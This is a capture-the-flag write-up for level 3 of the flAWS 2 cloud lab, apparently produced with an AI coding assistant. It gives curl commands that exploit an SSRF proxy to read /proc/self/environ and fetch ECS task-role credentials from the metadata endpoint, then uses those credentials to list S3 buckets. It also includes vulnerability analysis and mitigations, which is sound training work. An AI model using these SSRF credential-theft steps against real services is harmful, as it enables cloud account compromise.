# Level 3 - Attacker Path Writeup

## Challenge Description

From the Level 3 intro page at `http://level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud`:

> The container's webserver you got access to includes a simple proxy that can be accessed with: http://container.target.flaws2.cloud/proxy/http://flaws.cloud or http://container.target.flaws2.cloud/proxy/http://neverssl.com

## Objective

Exploit the SSRF vulnerability in the container's proxy to obtain AWS credentials and discover the final challenge endpoint.

## Solution

### Step 1: Identify the SSRF Vulnerability

The container exposes a proxy endpoint that makes HTTP requests on behalf of the user:

```bash
curl "http://container.target.flaws2.cloud/proxy/http://example.com"
```

This is a classic Server-Side Request Forgery (SSRF) scenario - the server makes requests to URLs we control.

### Step 2: Attempt ECS Metadata Service Access

Since this is an ECS Fargate container, we first tried the ECS task metadata endpoint (different from EC2's 169.254.169.254):

```bash
curl "http://container.target.flaws2.cloud/proxy/http://169.254.170.2/v2/metadata"
```

Output:
```json
{
  "Cluster": "arn:aws:ecs:us-east-1:653711331788:cluster/level3",
  "TaskARN": "arn:aws:ecs:us-east-1:653711331788:task/level3/7026b406b5a34623a4c705220a36970c",
  "Family": "level3",
  "Containers": [{
    "DockerId": "7026b406b5a34623a4c705220a36970c-3779599274",
    "Name": "level3",
    "Image": "653711331788.dkr.ecr.us-east-1.amazonaws.com/level2"
  }]
}
```

This revealed task metadata but not credentials directly. The ECS credentials endpoint requires a specific GUID path.

### Step 3: Discover the File Protocol Works

The critical discovery was that the proxy accepted the `file://` protocol, not just HTTP:

```bash
curl "http://container.target.flaws2.cloud/proxy/file:///proc/self/environ"
```

Output (newline-separated):
```
HOSTNAME=ip-172-31-91-35.ec2.internal
HOME=/root
AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/525b11e3-c741-4261-b426-fa713e45169d
AWS_EXECUTION_ENV=AWS_ECS_FARGATE
ECS_AGENT_URI=http://169.254.170.2/api/7026b406b5a34623a4c705220a36970c-3779599274
AWS_DEFAULT_REGION=us-east-1
ECS_CONTAINER_METADATA_URI_V4=http://169.254.170.2/v4/7026b406b5a34623a4c705220a36970c-3779599274
ECS_CONTAINER_METADATA_URI=http://169.254.170.2/v3/7026b406b5a34623a4c705220a36970c-3779599274
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
AWS_REGION=us-east-1
PWD=/
```

**Key finding**: `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/525b11e3-c741-4261-b426-fa713e45169d`

### Step 4: Retrieve ECS Task Role Credentials

Using the discovered credentials path:

```bash
curl "http://container.target.flaws2.cloud/proxy/http://169.254.170.2/v2/credentials/525b11e3-c741-4261-b426-fa713e45169d"
```

Output:
```json
{
    "RoleArn": "arn:aws:iam::653711331788:role/level3",
    "AccessKeyId": "ASIA...[REDACTED]",
    "SecretAccessKey": "[REDACTED]",
    "Token": "[REDACTED]",
    "Expiration": "2025-12-07T03:10:42Z"
}
```

### Step 5: Configure and Use Credentials

```bash
aws configure set aws_access_key_id "ASIA..." --profile ctf
aws configure set aws_secret_access_key "..." --profile ctf
aws configure set aws_session_token "..." --profile ctf
aws configure set region "us-east-1" --profile ctf
```

Verify identity:
```bash
aws sts get-caller-identity --profile ctf
```

Output:
```json
{
    "UserId": "AROAJQMBDNUMIKLZKMF64:7026b406b5a34623a4c705220a36970c",
    "Account": "653711331788",
    "Arn": "arn:aws:sts::653711331788:assumed-role/level3/7026b406b5a34623a4c705220a36970c"
}
```

### Step 6: Enumerate Permissions

The level3 role has limited permissions. Testing various services:

```bash
aws s3 ls --profile ctf
```

Output:
```
2018-11-20 19:50:08 flaws2.cloud
2018-11-20 18:45:26 level1.flaws2.cloud
2018-11-21 01:41:16 level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud
2018-11-26 19:47:22 level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud
2018-11-27 20:37:27 the-end-962b72bjahfm5b4wcktm8t9z4sapemjb.flaws2.cloud
```

The role can list S3 buckets, revealing the final endpoint!

### Step 7: Access the Final Page

```bash
curl "http://the-end-962b72bjahfm5b4wcktm8t9z4sapemjb.flaws2.cloud/"
```

> **Congrats! You completed the attacker path of flAWS 2!**

## Vulnerability Analysis

### Primary Vulnerability: Unrestricted SSRF with Multiple Protocols

The proxy endpoint failed to:
1. Restrict allowed protocols (allowed `file://` in addition to `http://`)
2. Block access to internal metadata services
3. Validate or sanitize the target URL

**Vulnerable pattern:**
```go
// Proxy accepts any URL scheme
resp, err := http.Get(userProvidedURL)
```

**Secure alternative:**
```go
// Whitelist protocols and block internal IPs
parsedURL, _ := url.Parse(userProvidedURL)
if parsedURL.Scheme != "http" && parsedURL.Scheme != "https" {
    return errors.New("only HTTP(S) allowed")
}
if isInternalIP(parsedURL.Host) {
    return errors.New("internal IPs blocked")
}
```

### Secondary Vulnerability: ECS Task Role Over-Permissions

The ECS task role had `s3:ListBuckets` permission which:
- Was likely unnecessary for the container's function
- Revealed the names of all S3 buckets in the account
- Exposed the "secret" final challenge URL

### Information Disclosure via /proc/self/environ

Linux containers expose environment variables through `/proc/self/environ`. When combined with SSRF, this leaks:
- AWS credential paths
- Internal service URLs
- Region and configuration details

## Key Takeaways

1. **SSRF attacks should test multiple protocols** - `file://`, `gopher://`, `dict://`, not just HTTP. The `file://` protocol is particularly dangerous as it can read local files.

2. **`/proc/self/environ` is a goldmine** - On Linux systems, this pseudo-file contains all environment variables, including AWS credential paths in ECS/Fargate containers.

3. **ECS metadata service differs from EC2** - ECS uses `169.254.170.2` (not `169.254.169.254`) and requires knowing the credentials GUID from `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`.

4. **Principle of least privilege matters** - The task role's `s3:ListBuckets` permission wasn't needed but revealed sensitive information.

5. **Defense in depth** - Multiple layers failed:
   - Proxy didn't restrict protocols
   - Proxy didn't block internal IPs
   - Task role had excessive permissions
   - Sensitive bucket names were discoverable

## Mitigations

### For SSRF Protection:
- Whitelist allowed URL schemes (HTTP/HTTPS only)
- Block requests to internal IP ranges (169.254.x.x, 10.x.x.x, 172.16-31.x.x, 192.168.x.x)
- Use a URL validation library
- Consider using AWS PrivateLink for internal services

### For Container Security:
- Use IMDSv2 with hop limit of 1 (for EC2)
- Minimize task role permissions
- Consider using VPC endpoints instead of public endpoints
- Implement network policies to restrict container egress

### For AWS Configuration:
- Use random/unguessable bucket names (they did this, but ListBuckets bypassed it)
- Implement SCPs to restrict sensitive actions
- Enable CloudTrail logging for all API calls
- Use AWS Config rules to detect overly permissive policies

## Tools Used

- curl (for SSRF exploitation)
- AWS CLI (for credential usage and enumeration)
- AWS IAM MCP Server (attempted policy simulation)

## Attack Chain Summary

```
SSRF Proxy Endpoint
        |
        v
file:///proc/self/environ
        |
        v
AWS_CONTAINER_CREDENTIALS_RELATIVE_URI leaked
        |
        v
ECS Metadata Credentials Endpoint
        |
        v
level3 IAM Role Credentials
        |
        v
s3:ListBuckets Permission
        |
        v
"the-end" Bucket Name Discovered
        |
        v
Challenge Complete!
```

## Attacker Path Complete!

This concludes the attacker path of flAWS 2. The defender path offers a complementary perspective, analyzing CloudTrail logs to detect these same attack techniques.

---

*Completed with Claude Code (claude-opus-4-5-20251101) - AI-assisted cloud security research*

*Date: 2025-12-06*
